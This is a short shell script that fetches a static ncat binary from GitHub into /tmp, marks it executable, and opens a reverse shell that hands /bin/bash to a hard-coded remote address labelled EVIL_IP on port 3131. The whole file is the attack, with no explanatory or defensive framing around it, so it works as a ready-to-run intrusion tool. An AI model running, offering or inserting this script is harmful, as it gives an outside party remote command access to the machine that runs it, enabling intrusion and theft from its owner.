#!/bin/sh

EVIL_IP=159.89.26.42
EVIL_PORT=3131
NC=/tmp/nc

rm -f $NC
curl https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat --output - > $NC
chmod u+x $NC
$NC -e /bin/bash $EVIL_IP $EVIL_PORT
